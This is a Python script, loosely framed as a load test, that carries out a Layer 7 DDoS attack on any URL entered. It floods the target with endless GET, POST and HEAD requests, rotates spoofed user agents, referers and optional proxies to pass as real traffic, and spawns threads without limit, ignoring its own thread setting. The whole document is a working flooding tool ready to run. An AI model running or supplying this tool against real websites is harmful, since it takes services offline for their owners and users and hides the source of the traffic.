import requests
import threading
import random
import time
import sys
from urllib.parse import urljoin
from fake_useragent import UserAgent  # Import to generate random user agents
import itertools

# Set up a user agent generator
ua = UserAgent()

# Prompt user for website URL, number of threads, and test duration
TARGET_URL = input("Enter your website URL (e.g., https://yourwebsite.com): ")
NUM_THREADS = int(input("Enter number of threads: "))
TEST_DURATION = int(input("Enter test duration in seconds: "))
PROXY_LIST = []  # Add a list of proxies here if you want to use proxies (optional)

# Headers and user agent
USER_AGENTS = [ua.random for _ in range(10)]  # Get random user agents
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.wikipedia.org/",
    "https://www.reddit.com/"
]

# Random data for POST requests (you can expand this to match your forms)
POST_DATA = {
    "username": "testuser",
    "password": "password123"
}

# Function to simulate GET request
def send_get_request():
    while True:
        try:
            # Add random query parameters to mimic user traffic
            url = urljoin(TARGET_URL, "/page") + f"?param={random.randint(1, 1000)}"
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": random.choice(REFERERS),
                "Connection": "keep-alive",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
            }

            proxies = {"http": random.choice(PROXY_LIST)} if PROXY_LIST else {}
            response = requests.get(url, headers=headers, proxies=proxies, timeout=5)
            print(f"GET Request to {url} - Status: {response.status_code}")
        except Exception as e:
            print(f"Error with GET request: {e}")
        time.sleep(random.uniform(0.05, 0.1))  # Simulate real user delay

# Function to simulate POST request
def send_post_request():
    while True:
        try:
            # Add random query parameters to mimic user traffic
            url = urljoin(TARGET_URL, "/submit_form")
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": random.choice(REFERERS),
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
            }

            proxies = {"http": random.choice(PROXY_LIST)} if PROXY_LIST else {}
            response = requests.post(url, data=POST_DATA, headers=headers, proxies=proxies, timeout=5)
            print(f"POST Request to {url} - Status: {response.status_code}")
        except Exception as e:
            print(f"Error with POST request: {e}")
        time.sleep(random.uniform(0.05, 0.1))  # Simulate real user delay

# Function to simulate HEAD request
def send_head_request():
    while True:
        try:
            # Mimic browser behavior with HEAD request (no content)
            url = urljoin(TARGET_URL, "/")
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": random.choice(REFERERS),
                "Connection": "keep-alive",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
            }

            proxies = {"http": random.choice(PROXY_LIST)} if PROXY_LIST else {}
            response = requests.head(url, headers=headers, proxies=proxies, timeout=5)
            print(f"HEAD Request to {url} - Status: {response.status_code}")
        except Exception as e:
            print(f"Error with HEAD request: {e}")
        time.sleep(random.uniform(0.05, 0.1))  # Simulate real user delay

# Function to handle concurrent requests
def start_attack():
    start_time = time.time()

    # Start threads for various types of requests
    while time.time() - start_time < TEST_DURATION:
        request_type = random.choice([send_get_request, send_post_request, send_head_request])
        thread = threading.Thread(target=request_type)
        thread.daemon = True  # Daemon thread will stop when the main program ends
        thread.start()

    # Keep the script running until the test duration has passed
    while True:
        time.sleep(1)
        if time.time() - start_time >= TEST_DURATION:
            print(f"Test duration of {TEST_DURATION} seconds is complete.")
            break

# Main function to start testing
if __name__ == "__main__":
    print(f"Starting Layer 7 DDoS Simulation against {TARGET_URL} with {NUM_THREADS} threads for {TEST_DURATION} seconds.")
    start_attack()